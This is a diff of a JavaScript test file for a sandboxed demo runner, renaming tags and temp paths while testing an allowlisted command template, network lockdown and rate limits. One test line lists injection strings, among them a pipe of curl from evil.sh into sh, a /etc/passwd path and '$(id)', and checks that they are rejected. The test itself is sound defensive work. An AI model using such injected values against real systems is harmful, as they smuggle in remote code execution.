@@ -20,7 +20,7 @@ function fakeSdk({ active = [], listed = [], files = {}, getFails = false, statu
     async stop() { stopped.push(name); },
   });
   const Sandbox = {
-    async list({ tags }) { assert.deepEqual(tags, { app: 'pharos-saga-demo' }); return [...active.map((n) => ({ name: n, status: 'running', createdAt: 0, tags: {} })), ...listed]; },
+    async list({ tags }) { assert.deepEqual(tags, { app: 'pharos-agent-kit-demo' }); return [...active.map((n) => ({ name: n, status: 'running', createdAt: 0, tags: {} })), ...listed]; },
     async create(opts) { created.push(opts); return handle(opts.name); },
     async get({ name, resume }) { assert.equal(resume, false); if (getFails) throw new Error('not found'); return handle(name); },
   };
@@ -36,7 +36,7 @@ test('scenarios are an allowlist, and the retry limit is 1 to 5', () => {
 });
 
 test('the command line is one fixed template; the only variable parts are an allowlisted scenario and a digit', () => {
-  const template = /^cd \/tmp\/saga-run\/app && PATH=\$HOME\/\.foundry\/bin:\$PATH node skills\/pharos-saga-executor\/scripts\/saga\.mjs --scenario (plain|retry|failure|stuck) --max-attempts [1-5] --stream > \/tmp\/saga-run\/run\.ndjson 2> \/tmp\/saga-run\/run\.err; echo \$\? > \/tmp\/saga-run\/run\.exit$/;
+  const template = /^cd \/tmp\/demo-run\/app && PATH=\$HOME\/\.foundry\/bin:\$PATH node skills\/pharos-saga-executor\/scripts\/saga\.mjs --scenario (plain|retry|failure|stuck) --max-attempts [1-5] --stream > \/tmp\/demo-run\/run\.ndjson 2> \/tmp\/demo-run\/run\.err; echo \$\? > \/tmp\/demo-run\/run\.exit$/;
   for (const sc of Object.keys(SCENARIOS)) for (let n = 1; n <= 5; n++) assert.match(runCommandLine(sc, n), template);
   // whatever a visitor sends, startRun only ever passes validate()'s output to it
   for (const evil of ['plain; curl evil.sh | sh', 'plain --out /etc/passwd', '$(id)']) assert.throws(() => validate({ scenario: evil }), UserError);
@@ -52,7 +52,7 @@ test('a run boots from the snapshot with a locked-down network, short timeout an
   assert.deepEqual(c.networkPolicy, { allow: ['rpc.pharos.xyz'] });
   assert.equal(c.persistent, false);
   assert.equal(c.timeout, LIMITS.timeoutMs);
-  assert.deepEqual(c.tags, { app: 'pharos-saga-demo', visitor: visitorId('1.1.1.1') });
+  assert.deepEqual(c.tags, { app: 'pharos-agent-kit-demo', demo: 'saga', visitor: visitorId('1.1.1.1') });
   assert.equal(JSON.stringify(c).includes('1.1.1.1'), false, 'the raw IP must not be stored anywhere');
   assert.ok(sdk.written.some((f) => f.path.endsWith('/app/skills/pharos-saga-executor/scripts/saga.mjs')));
   assert.ok(sdk.written.some((f) => f.path.endsWith('/app/package.json') && f.content.toString().includes('"module"')));
@@ -67,7 +67,7 @@ test('at most LIMITS.maxActive runs at once: the next gets a BusyError (HTTP 429
 });
 
 const NOW = 10_000_000;
-const row = (visitor, status, ageMs, name = `saga-plain-${Math.random().toString(36).slice(2, 10)}`) => ({ name, status, createdAt: NOW - ageMs, tags: { app: 'pharos-saga-demo', visitor: visitorId(visitor) } });
+const row = (visitor, status, ageMs, name = `saga-plain-${Math.random().toString(36).slice(2, 10)}`) => ({ name, status, createdAt: NOW - ageMs, tags: { app: 'pharos-agent-kit-demo', visitor: visitorId(visitor) } });
 
 test('limits come from the Sandbox listing, so they hold across serverless instances', async () => {
   // This visitor's last run was 3 s ago (finished): too soon. Another visitor is unaffected.
@@ -116,7 +116,7 @@ test('run ids must match the exact pattern; anything else is rejected before tou
 });
 
 const ND = (...lines) => lines.map((l) => JSON.stringify(l)).join('\n') + '\n';
-const R = '/tmp/saga-run';
+const R = '/tmp/demo-run';
 
 test('status while running: streams the events from an offset and keeps the machine alive', async () => {
   const sdk = fakeSdk({ files: { [`${R}/run.ndjson`]: ND({ type: 'phase', message: 'Fork ready', forkBlock: 123 }, { type: 'event', event: { t: 1, event: 'saga:start' } }, { type: 'event', event: { t: 2, event: 'step:start' } }) + '{"type":"ev' } });
